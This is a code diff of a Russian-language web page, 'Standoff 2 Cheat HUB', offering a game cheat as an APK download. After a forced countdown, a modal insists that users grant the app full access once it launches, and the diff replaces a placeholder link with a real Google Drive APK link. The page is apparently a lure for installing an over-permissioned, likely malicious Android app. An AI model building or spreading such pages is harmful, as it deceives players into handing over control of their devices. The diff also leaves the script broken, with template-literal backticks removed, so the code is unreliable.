@@ -2,58 +2,44 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Standoff 2 Cheat HUB</title>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
     body {
       background: #0f0f0f;
       color: #f2f2f2;
       font-family: 'Segoe UI', sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-start;
-      min-height: 100vh;
-      padding: 40px 20px;
+      text-align: center;
+      padding-top: 100px;
     }
 
     .container {
-      width: 100%;
       max-width: 500px;
+      margin: auto;
       background: #1a1a1a;
-      padding: 35px 25px;
-      border-radius: 24px;
-      box-shadow: 0 0 30px rgba(255, 255, 255, 0.08);
-      text-align: center;
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
     }
 
     h1 {
       color: #00ffcc;
-      margin-bottom: 25px;
-      font-size: 28px;
+      margin-bottom: 20px;
     }
 
     p {
       color: #bbbbbb;
-      font-size: 18px;
-      line-height: 1.6;
+      font-size: 16px;
     }
 
     .download-btn {
       display: inline-block;
-      margin-top: 35px;
-      padding: 18px 35px;
+      margin-top: 30px;
+      padding: 15px 30px;
       background-color: #00cc99;
       color: #fff;
-      border-radius: 14px;
+      border-radius: 10px;
       font-weight: bold;
-      font-size: 18px;
+      font-size: 16px;
       text-decoration: none;
       transition: background-color 0.3s ease;
       cursor: pointer;
@@ -72,40 +58,34 @@
       top: 0;
       width: 100%;
       height: 100%;
-      background-color: rgba(0,0,0,0.75);
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
+      background-color: rgba(0,0,0,0.7);
     }
 
     .modal-content {
       background-color: #1a1a1a;
-      padding: 30px 25px;
-      border-radius: 20px;
-      width: 100%;
-      max-width: 420px;
+      margin: 15% auto;
+      padding: 30px;
+      border-radius: 15px;
+      width: 80%;
+      max-width: 400px;
       color: #fff;
       text-align: center;
-      box-shadow: 0 0 25px #00ffcc;
+      box-shadow: 0 0 20px #00ffcc;
     }
 
     .modal-content p {
-      margin-bottom: 25px;
-      font-size: 18px;
-      line-height: 1.5;
+      margin-bottom: 20px;
     }
 
     #confirmBtn {
       background-color: #00cc99;
-      padding: 15px 30px;
+      padding: 10px 20px;
       border: none;
-      border-radius: 12px;
+      border-radius: 8px;
       color: white;
       font-weight: bold;
-      font-size: 18px;
       cursor: not-allowed;
       opacity: 0.6;
-      transition: opacity 0.3s;
     }
 
     #confirmBtn.enabled {
@@ -121,13 +101,16 @@
     <p>Добро пожаловать в приватный хаб читов для Standoff 2.<br>
        Здесь ты можешь скачать последнюю версию чита и получить доступ к обновлениям.</p>
 
-    <span class="download-btn" onclick="showModal()">📥 Скачать чит</span>
+    <!-- Кнопка скачивания вызывает модальное окно -->
+    <span class="download-btn" onclick="showModal()">Скачать чит</span>
   </div>
 
+  <!-- Модальное окно -->
   <div id="infoModal" class="modal">
     <div class="modal-content">
       <p>
         ⚠️ <strong>Уведомление:</strong><br>
+        <!-- Твой текст здесь -->
         После запуска чита ОБЯЗАТЕЛЬНО дайте полный доступ, ИНАЧЕ ЧИТ-МЕНЮ НЕ БУДЕТ ОТОБРАЖАТСЯ!
       </p>
       <button id="confirmBtn" disabled>Подождите 10 секунд...</button>
@@ -136,28 +119,23 @@
 
   <script>
     function showModal() {
-      const modal = document.getElementById('infoModal');
-      modal.style.display = 'flex';
-      document.body.style.overflow = 'hidden';
-
-      const btn = document.getElementById('confirmBtn');
+      document.getElementById('infoModal').style.display = 'block';
+      let btn = document.getElementById('confirmBtn');
       let seconds = 10;
-      btn.innerText = `Подождите ${seconds} секунд...`;
+      btn.innerText = Подождите ${seconds} секунд...;
       btn.classList.remove('enabled');
 
       let countdown = setInterval(() => {
         seconds--;
         if (seconds > 0) {
-          btn.innerText = `Подождите ${seconds} секунд...`;
+          btn.innerText = Подождите ${seconds} секунд...;
         } else {
           clearInterval(countdown);
-          btn.innerText = "✅ Я понял";
+          btn.innerText = "Я понял";
           btn.disabled = false;
           btn.classList.add('enabled');
           btn.onclick = () => {
-            window.location.href = "https://your-apk-host-link.com/yourfile.apk";
-            document.body.style.overflow = '';
-            modal.style.display = 'none';
+            window.location.href = "https://drive.google.com/uc?export=download&id=1LyQIFADCeZzLq-yg59VzpOyMp7IIkCLy"; // сюда вставь ссылку на apk
           };
         }
       }, 1000);
